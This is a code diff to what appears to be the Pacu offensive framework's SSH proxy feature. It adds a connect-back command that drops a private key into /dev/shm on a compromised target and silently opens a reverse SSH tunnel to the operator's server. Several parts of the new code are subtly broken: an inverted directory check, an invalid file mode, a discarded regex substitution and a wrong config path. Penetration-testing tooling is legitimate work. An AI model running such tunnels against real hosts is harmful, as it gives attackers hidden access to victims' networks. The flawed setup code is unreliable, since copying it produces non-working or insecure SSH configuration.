@@ -364,7 +364,7 @@ def get_ssh_user(ssh_user, database):
         if new_user == 'y':
             # Create a random username that is randomly 3-9 characters
             username = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
-            command = 'adduser --shell /bin/false --disabled-password {}'.format(username)
+            command = 'adduser --shell /bin/false --gecos "" --disabled-password {}'.format(username)
             util.print('Running command: {}\n'.format(command))
             try:
                 subprocess.run(command.split(' '), shell=True)
@@ -406,21 +406,38 @@ def get_ssh_user(ssh_user, database):
 
 def get_ssh_key(ssh_user, database):
     if 'SSHKey' not in ssh_user or ssh_user['SSHKey'] is None or ssh_user['SSHKey'] == '':
-        new_key = util.input('No SSH key found for user {}. Do you want to generate one? (y/n) '.format(ssh_user['UserName']))
+        new_key = util.input('No SSH key found for user {}. Do you want to generate one? (y/n) '.format(ssh_user['UserName']), database)
 
         if new_key == 'y':
-            util.print('Creating SSH key for user {}...\n'.format(ssh_user['UserName']))
+            util.print('Setting up SSH access for user {}...\n'.format(ssh_user['UserName']), database)
             ssh_dir = '/home/{}/.ssh'.format(ssh_user['UserName'])
-            if os.path.isdir(ssh_dir):
-                os.makedirs(ssh_dir)
-            command = "ssh-keygen -t rsa -f {}/id_rsa -N '' {}".format(ssh_dir, ssh_user['UserName'])
+            command = 'ssh-keygen -t rsa -f {}/id_rsa -N ""'.format(ssh_dir)
             try:
+                util.print('Creating .ssh dir for user {} and passing ownership...'.format(ssh_user['UserName']), database)
+                if os.path.isdir(ssh_dir):
+                    os.makedirs(ssh_dir)
+                subprocess.run('chown -R {}:{} {}'.format(ssh_user['UserName'], ssh_user['UserName'], ssh_dir), shell=True)
+                subprocess.run('chmod 700 {}'.format(ssh_dir), shell=True)
+                util.print('Generating public and private SSH key...', database)
                 subprocess.run(command, shell=True)
+                util.print('Creating authorized_keys file...', database)
+                subprocess.run('cp {}/id_rsa.pub {}/authorized_keys'.format(ssh_dir, ssh_dir))
+                util.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario)...')
+                with open('/etc/sshd_config', 'rw') as f:
+                    contents = f.read()
+                    if 'AllowTcpForwarding' in contents:
+                        if 'AllowTcpForwarding remote' in contents:
+                            util.print('Already disabled.', database)
+                        else:
+                            re.sub(r'AllowTcpForwarding.*', 'AllowTcpForwarding remote', contents)
+                    else:
+                        f.write(contents)
                 with open('{}/id_rsa'.format(ssh_dir), 'r') as f:
                     ssh_user['SSHKey'] = f.read()
+
                 return ssh_user
             except:
-                util.print('Could not generate an SSH key for user {}...'.format(ssh_user['UserName']))
+                util.print('Could not setup SSH access for user {}...'.format(ssh_user['UserName']), database)
                 return ssh_user
         else:
             return ssh_user
@@ -516,6 +533,10 @@ def parse_command(command, database):
                             session.update(database, Proxy=proxy_data)
                             return
 
+                        restart = False
+                        if proxy_data['SSHUser']['SSHKey'] is None or proxy_data['SSHUser']['SSHKey'] == '':
+                            restart = True
+
                         # Find or generate an SSH key for that user
                         proxy_data['SSHUser'] = get_ssh_key(proxy_data['SSHUser'], database)
                         if proxy_data['SSHUser']['SSHKey'] is None:
@@ -523,8 +544,20 @@ def parse_command(command, database):
                             session.update(database, Proxy=proxy_data)
                             return
 
+                        # If an SSH key was just generated, make sure local port forwarding is disabled
+                        if restart is True:
+                            util.print('SSH user setup successfully. It is highly recommended to restart your sshd service before continuing. Part of the SSH user creation process was to restrict access to local port forwarding, but this change requires an sshd restart. If local port forwarding is not disabled, your target machine can "hack back" by forwarding your local ports to their machine and accessing the services hosted on them. This can be done by running "service sshd restart".\n', database)
+                            session.update(database, Proxy=proxy_data)
+                            restart_sshd = util.input('  Do you want Pacu to restart sshd (Warning: If you are currently connected to your server over SSH, you may lose your connection)? Press enter if so, enter "ignore" to ignore this warning, or press Ctrl+C to exit and restart it yourself (Enter/ignore/Ctrl+C): ', database)
+
+                            if restart_sshd == 'ignore':
+                                pass
+                            elif restart_sshd == '':
+                                util.print('Restarting sshd...', database)
+                                subprocess.run('service sshd restart', shell=True)
+
                         proxy_data['Target'] = int(cmd[2])
-                        connect_back_cmd = 'echo "{}" > /dev/shm/tmp11 && ssh -i /dev/shm/tmp11 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 443 {}@{}'.format(proxy_data['SSHUser']['SSHKey'], proxy_data['SSHUser']['UserName'], proxy_data['IP'])
+                        connect_back_cmd = 'echo "{}" > /dev/shm/tmp11 && chmod 600 /dev/shm/tmp11 && ssh -i /dev/shm/tmp11 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8000 {}@{} >/dev/null 2>&1'.format(proxy_data['SSHUser']['SSHKey'], proxy_data['SSHUser']['UserName'], proxy_data['IP'])
                         global_config['Proxy'].run_cmd(proxy_data['Target'], global_config['Proxy'].all_connections[int(cmd[2])], connect_back_cmd)
                 except:
                     print('** Invalid agent ID, expected an integer or "none", received: {}'.format(cmd[2]))
